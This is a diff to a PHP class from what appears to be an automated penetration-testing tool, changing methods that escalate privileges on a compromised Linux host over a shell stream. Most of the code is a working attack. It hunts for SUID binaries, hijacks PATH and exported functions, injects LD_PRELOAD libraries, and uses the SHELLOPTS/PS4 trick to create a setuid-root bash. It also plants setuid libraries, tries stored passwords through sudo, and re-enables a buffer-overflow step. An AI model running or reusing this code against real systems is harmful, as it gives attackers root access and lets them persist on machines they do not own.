@@ -4,8 +4,8 @@
 class check4linux8suid extends check4linux8exploits{
     var $socat_path ;
     
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
+    public function __construct($eth,$domain,$ip,$port,$protocol) {
+        parent::__construct($eth,$domain,$ip,$port,$protocol);
     }
     
     /*
@@ -33,14 +33,14 @@ class check4linux8suid extends check4linux8exploits{
     
     
     
-    public function suids8env($suid_path){
+    public function suids8env($stream,$suid_path){
         $this->titre(__FUNCTION__);
-        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2path($suid_path);
-        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2ld_preload($suid_path);
+        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2path($stream,$suid_path);
+        if (!$this->ip2root8db($this->ip2id))  $this->suids8env2ld_preload($stream,$suid_path);
     }
     
     
-    public function suids(){
+    public function suids($stream){
         // https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
         // https://book.hacktricks.xyz/linux-unix/privilege-escalation
         
@@ -49,15 +49,15 @@ class check4linux8suid extends check4linux8exploits{
         $lines = "";
         $this->note("exec root file");
         $data = "find / -perm -o=wx -uid 0 -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null  ";
-        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
+        $lines .= $this->req_str($stream,$data,$this->stream_timeout*3,"");
         $this->pause();
         $this->note("exec group root file");
         $data = "find / -perm -o=wx -gid 0 -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null  ";
-        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
+        $lines .= $this->req_str($stream,$data,$this->stream_timeout*3,"");
         $this->pause();
         $this->note("Sticky Bits");
         $data = "find / -perm -u=s -type f -maxdepth 5 -exec ls -al {} \; 2> /dev/null";
-        $lines .= $this->lan2stream4result($data,$this->stream_timeout*3);
+        $lines .= $this->req_str($stream,$data,$this->stream_timeout*3,"");
         $this->pause();
 
         $this->article("Find files/ folder owned by the user","After compromising the machine with an unprivileged shell,
@@ -85,22 +85,22 @@ Many times, we do want to see if there are any files owned by those users outsid
 
     
     
-    public function suids4one($suid){
+    public function suids4one($stream,$suid){
         $this->titre(__FUNCTION__);
         if (!empty($suid)){            
             $data = "chmod 777 $suid";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             $this->pause();                       
-            if (!$this->ip2root8db($this->ip2id)) $this->lan2file2backdoor($suid);
-            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");
-            if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);
-            if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);           
-            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($suid);     
+            if (!$this->ip2root8db($this->ip2id)) $this->backdoor($stream,$suid);
+            if (!$this->ip2root8db($this->ip2id)) $this->root8bin($stream,$suid,FALSE,"");
+            if (!$this->ip2root8db($this->ip2id))  $this->suids8env($stream,$suid);
+            if (!$this->ip2root8db($this->ip2id))  $this->suids8app($stream,$suid);           
+            if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($stream,$suid);     
         }
     }
     
     
-    public function suids4all($tab_suid){
+    public function suids4all($stream,$tab_suid){
         $this->titre(__FUNCTION__);
         $this->article("SUID", "\n".$this->tab($tab_suid));
         
@@ -109,31 +109,31 @@ Many times, we do want to see if there are any files owned by those users outsid
         
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->pause();
         
         $size = count($tab_suid);        
         for($i=0;$i<$size;$i++){
             $this->article("$i/$size Test on Suid", $tab_suid[$i]);
-            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($tab_suid[$i],FALSE,"");
+            if (!$this->ip2root8db($this->ip2id)) $this->root8bin($stream,$tab_suid[$i],FALSE,"");
             $this->pause();
         }
         
         
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->pause();
         
         $size = count($tab_suid);
         for($i=0;$i<$size;$i++){
             $this->article("$i/$size Test on Suid", $tab_suid[$i]);
-            if (!$this->ip2root8db($this->ip2id)) $this->suids8env($tab_suid[$i]);
+            if (!$this->ip2root8db($this->ip2id)) $this->suids8env($stream,$tab_suid[$i]);
             $this->pause();
         }
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->pause();
         
         
@@ -146,7 +146,7 @@ Many times, we do want to see if there are any files owned by those users outsid
         }
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->pause();
         
         
@@ -158,7 +158,7 @@ Many times, we do want to see if there are any files owned by those users outsid
         }
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->pause();
 
 
@@ -167,7 +167,7 @@ Many times, we do want to see if there are any files owned by those users outsid
     
     
     
-    public function suids8env2path2var($suid_path){ // OK //billu box 2
+    public function suids8env2path2var($stream,$suid_path){ // OK //billu box 2
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $shell = "/bin/sh";
@@ -188,17 +188,17 @@ Many times, we do want to see if there are any files owned by those users outsid
         
         $env_var = "getenv\(\"[A-Z0-9]{1,}\"\)";
         $data = "strings $suid_path | grep \"getenv\(\" | grep -Po '$env_var' ";
-        $check_env_var_req = $this->lan2stream4result($data,$this->stream_timeout);
+        $check_env_var_req = $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "echo '$check_env_var_req' | grep -Po '$env_var'  ";
         $check_env_var = trim($this->req_ret_str($data));
         
-        if (!empty($check_env_var)) $this->suids8env2path4var($check_env_var,$suid_path);
+        if (!empty($check_env_var)) $this->suids8env2path4var($stream,$check_env_var,$suid_path);
         
         return $result;
     }
     
-    public function suids8env2path4var($var,$suid_path){ // OK //billu box 2
+    public function suids8env2path4var($stream,$var,$suid_path){ // OK //billu box 2
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $shell = "/bin/sh";
@@ -207,7 +207,7 @@ Many times, we do want to see if there are any files owned by those users outsid
         $cmd = "/usr/bin/id";
         $template_id_euid = "export $var=\"%ID%\" ; $suid_path ";       
 
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         
  
         return $result;
@@ -217,7 +217,7 @@ Many times, we do want to see if there are any files owned by those users outsid
     
     
     
-    public function suids8app($suid){
+    public function suids8app($stream,$suid){
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $tmp = array();
@@ -233,11 +233,11 @@ Many times, we do want to see if there are any files owned by those users outsid
         
         
         
-        $this->lan2file4writable($filepath);
+        $this->file4writable($filepath);
         
 
         $data = "strings $suid ";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
 
         
         exec("echo '".base64_encode($lines)."' | base64 -d | grep -Po \"^(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\" | sort -u ",$tmp);
@@ -250,23 +250,23 @@ Many times, we do want to see if there are any files owned by those users outsid
                     echo "\n====START FILE=======================================================\n";
                     $obj_file = new FILE($exec_path);
                     $data = "chmod 777 $obj_file->file_path";
-                    $this->lan2stream4result($data,$this->stream_timeout);
+                    $this->req_str($stream,$data,$this->stream_timeout,"");
                     
                     $data = "ls -al $obj_file->file_path 2> /dev/null";
-                    $this->lan2stream4result($data,$this->stream_timeout);
+                    $this->req_str($stream,$data,$this->stream_timeout,"");
                     $data = "file $obj_file->file_path 2> /dev/null";
-                    $this->lan2stream4result($data,$this->stream_timeout);
+                    $this->req_str($stream,$data,$this->stream_timeout,"");
                     $data = "stat $obj_file->file_path 2> /dev/null";
-                    $this->lan2stream4result($data,$this->stream_timeout);
+                    $this->req_str($stream,$data,$this->stream_timeout,"");
 
                     $this->article("Ext", $obj_file->file_ext);
                     switch ($obj_file->file_ext) {
                         
                         case "" :
                     $data = "strace -s 999 -v -f $obj_file->file_path | grep -E \"(open|access)\" ";
-                    $result .= $this->lan2stream4result($data,$this->stream_timeout);
+                    $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
                     $data = "ltrace $obj_file->file_path";
-                    $this->lan2stream4result($data,$this->stream_timeout);                    
+                    $this->req_str($stream,$data,$this->stream_timeout,"");                    
                     $this->suids8env2path4function($suid, $exec_path);
                     break;
                     
@@ -286,45 +286,45 @@ Many times, we do want to see if there are any files owned by those users outsid
     }
     
     
-    public function suids4elf($suid){
-        $suid_call = $this->lan2bin4syscall($suid);
+    public function suids4elf($stream,$suid){
+        $suid_call = $this->bin4syscall($suid);
         //$suid_call = "whoami";
         $this->article("calling ",$suid_call);
         if(!empty($suid_call)){
-            if(strstr($suid_call, "/")!==FALSE) {if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path4function($suid, $suid_call);$this->pause();}
+            if(strstr($suid_call, "/")!==FALSE) {if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path4function($stream,$suid, $suid_call);$this->pause();}
             else {
-                if (!$this->ip2root8db($this->ip2id)) {$this->suids8env2path4add($suid,$suid_call); $this->pause();}
+                if (!$this->ip2root8db($this->ip2id)) {$this->suids8env2path4add($stream,$suid,$suid_call); $this->pause();}
             }
         }
     }
     
-    public function suids8env2path($suid){
+    public function suids8env2path($stream,$suid){
         $this->titre(__FUNCTION__);
 
         // https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 
-        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($suid);$this->pause(); // OK 
-        if (!$this->ip2root8db($this->ip2id)) $this->suids4elf($suid);$this->pause(); // OK
-        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2var($suid);$this->pause();
+        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($stream,$suid);$this->pause(); // OK 
+        if (!$this->ip2root8db($this->ip2id)) $this->suids4elf($stream,$suid);$this->pause(); // OK
+        if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2var($stream,$suid);$this->pause();
     }
     
     
-    public function suids8env2path4add($suid,$suid_call){ // OK //billu box 2
+    public function suids8env2path4add($stream,$suid,$suid_call){ // OK //billu box 2
 
         $this->ssTitre(__FUNCTION__);
         
         if (!empty($suid_call)){
         $data = "echo \"/usr/bin/id\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         
         $template_id_euid = "echo \"%ID%\" > $this->vm_tmp_lin/$suid_call ; chmod 755 $this->vm_tmp_lin/$suid_call ; export PATH=\"$this->vm_tmp_lin:\$PATH\" ; $suid ";        // OK
 
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         
         }
     }
     
-    public function suids8env2ld_preload($suid_path){
+    public function suids8env2ld_preload($stream,$suid_path){
         
         $result = "";
         $result .= $this->titre(__FUNCTION__);
@@ -332,13 +332,13 @@ Many times, we do want to see if there are any files owned by those users outsid
         
         $ld_preload_env = "LD_PRELOAD";
         $data = "printenv | grep -v \"LS_COLOR\" | strings | grep \"$ld_preload_env\" ";
-        $check_ld_preload_req = $this->lan2stream4result($data,$this->stream_timeout);
+        $check_ld_preload_req = $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "echo \"$check_ld_preload_req\" | grep -Po \"$ld_preload_env\"  ";
         $check_ld_preload = $this->req_ret_str($data);
         if(!empty($check_ld_preload)){
         $data = "gdb -q --batch -ex \"info functions\" $suid_path | grep -v \"@\"";
-        $functions_internes = $this->lan2stream4result($data,$this->stream_timeout);
+        $functions_internes = $this->req_str($stream,$data,$this->stream_timeout,"");
         $data = "echo '$functions_internes' | grep -v '@'  ";
         $functions_internes_tab = $this->req_ret_tab($data);
         foreach ($functions_internes_tab as $functions_internes_name)
@@ -365,34 +365,34 @@ EOC;
                 // execl("/bin/sh","sh",(char*)0);
                 
                 $data = "echo '$lib_suid' > $this->vm_tmp_lin/libsuid.c ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $this->pause();
                 
                 $data = "gcc -m32 -shared -o $this->vm_tmp_lin/libsuid.so $this->vm_tmp_lin/libsuid.c ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $this->pause();
                 
                 $data = "chmod u+s $this->vm_tmp_lin/libsuid ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $data = "ls -al $this->vm_tmp_lin/libsuid ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $this->pause();
                 
                 $data = "chmod 4755 $this->vm_tmp_lin/libsuid ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $data = "ls -al $this->vm_tmp_lin/libsuid ";
-                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                 $result .= $lines;
                 $this->pause();
                 
                 $template_id_euid = "export LD_PRELOAD=$this->vm_tmp_lin/libsuid ; $suid_path \"%ID%\""; 
 
-                $this->lan2pentest8id($template_id_euid);
+                $this->pentest8id($stream,$template_id_euid);
                 
                 $this->pause();
                 
@@ -403,28 +403,28 @@ EOC;
         
         return $result;
     }
-    public function suids8app2lib($lib,$suid){ // OK //billu box 2
+    public function suids8app2lib($stream,$lib,$suid){ // OK //billu box 2
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $obj_file = new FILE($lib);
 
-        if ($this->lan2file4exist($obj_file->file_path)===FALSE) {
-            if ($this->lan2file4exist($obj_file->file_dir)===FALSE){
+        if ($this->file4exist($stream,$obj_file->file_path)===FALSE) {
+            if ($this->file4exist($stream,$obj_file->file_dir)===FALSE){
                 $this->article("Creat Dir", $obj_file->file_dir);
                 $data = "mkdir $obj_file->file_dir";
-                $this->lan2stream4result($data,$this->stream_timeout);
+                $this->req_str($stream,$data,$this->stream_timeout,"");
                 $data = "cd ..$obj_file->file_dir; chmod +rx .";
-                $this->lan2stream4result($data,$this->stream_timeout);
+                $this->req_str($stream,$data,$this->stream_timeout,"");
                 $this->pause();
                 
             }
             $data = "echo '' > $obj_file->file_path";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "chmod 777 $obj_file->file_path";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
         }
         
-        if( ($this->lan2file4writable($obj_file->file_path)) && ($this->lan2file4exist($obj_file->file_path)===TRUE) ){
+        if( ($this->file4writable($stream,$obj_file->file_path)) && ($this->file4exist($stream,$obj_file->file_path)===TRUE) ){
             
             
             
@@ -434,20 +434,20 @@ EOC;
             
             
             $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "ls -al $obj_file->file_path ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
-            //$this->lan2stream4result($data,$this->stream_timeout);
+            //$this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
-            //$this->lan2stream4result($data,$this->stream_timeout);
+            //$this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "chmod +s $obj_file->file_path ";
-            $lines = $this->lan2stream4result($data,$this->stream_timeout);
+            $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "chmod 777 $obj_file->file_path";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
             $users4passwd = $this->ip2users4passwd();
@@ -455,7 +455,7 @@ EOC;
             $this->ssTitre("User and Password");
             foreach ($users4passwd as $username => $userpass){
                 $data_check = "echo '$userpass' | sudo -S -u $username $suid ";
-                $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
+                $rst = $this->req_str($stream,$data_check,$this->stream_timeout,"");
                list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 // var_dump($username_found);
                 //$this->pause();
@@ -463,7 +463,7 @@ EOC;
                 if ( !empty($username_found) ){
                     
                     $this->article("username found", $username_found);
-                    $username_now = $this->lan2whoami();
+                    $username_now = $this->whoami();
                     $this->article("username now", $username_now);
                     //$this->pause();
                     if ($username_now !== $username_found){
@@ -474,28 +474,28 @@ EOC;
                         
                         
                         $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
-                        $this->lan2stream4result($data,$this->stream_timeout);
+                        $this->req_str($stream,$data,$this->stream_timeout,"");
                         
                         $data = "ls -al $obj_file->file_path ";
-                        $this->lan2stream4result($data,$this->stream_timeout);
+                        $this->req_str($stream,$data,$this->stream_timeout,"");
                         $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
-                        //$this->lan2stream4result($data,$this->stream_timeout);
+                        //$this->req_str($stream,$data,$this->stream_timeout,"");
                         $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
-                        //$this->lan2stream4result($data,$this->stream_timeout);
+                        //$this->req_str($stream,$data,$this->stream_timeout,"");
                         $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
-                        $this->lan2stream4result($data,$this->stream_timeout);
+                        $this->req_str($stream,$data,$this->stream_timeout,"");
                         $data = "chmod +s $obj_file->file_path ";
-                        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                         $data = "chmod 777 $obj_file->file_path";
-                        $this->lan2stream4result($data,$this->stream_timeout);
+                        $this->req_str($stream,$data,$this->stream_timeout,"");
                         
                         $data_check = "echo '$userpass' | sudo -S -u $username $suid";
-                        $this->lan2stream4result($data_check,$this->stream_timeout);
+                        $this->req_str($stream,$data_check,$this->stream_timeout,"");
                         
                         
                         $template_id_test = "/tmp/bash_$username_now"."_$username_found -p -c %ID%";
                         
-                        $this->lan2pentest8id($template_id_test);
+                        $this->pentest8id($template_id_test);
                     }
                 }
                 
@@ -506,14 +506,14 @@ EOC;
                 foreach ($users4shell as $user_shell){
                     if (!empty($user_shell)){
                         $data_check = "echo '$userpass' | sudo -S -u $user_shell $suid";
-                        $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
+                        $rst = $this->req_str($stream,$data_check,$this->stream_timeout,"");
                         list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                         // var_dump($username_found);
                         //$this->pause();
                         
                         if ( !empty($username_found) ){                      
                             $this->article("username found", $username_found);
-                            $username_now = $this->lan2whoami();
+                            $username_now = $this->whoami();
                             $this->article("username now", $username_now);
                             //$this->pause();
                             if ($username_now!==$username_found){
@@ -525,36 +525,36 @@ EOC;
                                 
                                 $data = "echo '$lib_bash' > $this->vm_tmp_lin/$obj_file->file_name.c ";
                                 $template_suid = "echo '$template_suid' > $this->vm_tmp_lin/$obj_file->file_name.c ";
-                                $this->lan2stream4result($data,$this->stream_timeout);
+                                $this->req_str($stream,$data,$this->stream_timeout,"");
                                 
                                 $data = "ls -al $obj_file->file_path ";
-                                $this->lan2stream4result($data,$this->stream_timeout);
+                                $this->req_str($stream,$data,$this->stream_timeout,"");
                                 $data = "gcc -fPIC -c $this->vm_tmp_lin/$obj_file->file_name.c ";
-                                //$this->lan2stream4result($data,$this->stream_timeout);
+                                //$this->req_str($stream,$data,$this->stream_timeout,"");
                                 $data = "ld -shared -o $obj_file->file_path $this->vm_tmp_lin/$obj_file->file_name.o ";
-                                //$this->lan2stream4result($data,$this->stream_timeout);
+                                //$this->req_str($stream,$data,$this->stream_timeout,"");
                                 
                                 $data = "gcc -shared -o $obj_file->file_path -fPIC $this->vm_tmp_lin/$obj_file->file_name.c ";
                                 $template_suid .= "; $data";
-                                $this->lan2stream4result($data,$this->stream_timeout);
+                                $this->req_str($stream,$data,$this->stream_timeout,"");
                                 
                                 $data = "chmod +s $obj_file->file_path ";
                                 $template_suid .= "; $data";
-                                $lines = $this->lan2stream4result($data,$this->stream_timeout);
+                                $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
                                 
                                 $data = "chmod 777 $obj_file->file_path";
-                                $this->lan2stream4result($data,$this->stream_timeout);
+                                $this->req_str($stream,$data,$this->stream_timeout,"");
                                 $template_suid .= "; $data_check";
 
                                 $data_check = "echo '$userpass' | sudo -S -u $user_shell $suid";
-                                $this->lan2stream4result($data_check,$this->stream_timeout);
+                                $this->req_str($stream,$data_check,$this->stream_timeout,"");
 
                                 
                                 $template_id_test = "/tmp/bash_$username_now"."_$username_found -p -c %ID%";
                                 
                                 
                                 
-                                $this->lan2pentest8id($template_id_test);
+                                $this->pentest8id($template_id_test);
 
                                }
                                 
@@ -573,17 +573,17 @@ EOC;
     
     
     
-    public function suids8bof($suid_path){ // OK 
+    public function suids8bof($stream,$suid_path){ // OK 
         $this->titre(__FUNCTION__);
         $obj_suid = new FILE($suid_path);
         $data = "ls -al $suid_path";
-        $this->lan2stream4result($data, $this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
 
         $data = "cp -v $suid_path /var/www/html/";
-        $this->lan2stream4result($data, $this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "ls -al /var/www/html/";
-        $this->lan2stream4result($data, $this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $bin_bof = "$this->dir_tmp/$obj_suid->file_name";
         $obj_bin = new exploit4linux($bin_bof);
@@ -597,10 +597,10 @@ EOC;
 
     
     
-    public function suids8env2path4function($suid,$filepath_call){ // OK //billu box 2
+    public function suids8env2path4function($stream,$suid,$filepath_call){ // OK //billu box 2
         $this->ssTitre(__FUNCTION__);
         $template_id_euid = "function $filepath_call () { %ID%; } ; export -f $filepath_call; $suid ";        // OK
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         
     }
     
@@ -611,13 +611,13 @@ EOC;
         
         $hash_suid = sha1($suid);
         $data = "env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/$hash_suid && chown root.root /tmp/$hash_suid && chmod +s /tmp/$hash_suid && /tmp/$hash_suid -p -c id)' /bin/sh -c  '$suid'";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "/tmp/$hash_suid -p -c id";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $template_id_euid = "/tmp/$hash_suid -p -c %ID% ";
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
     }
     
     
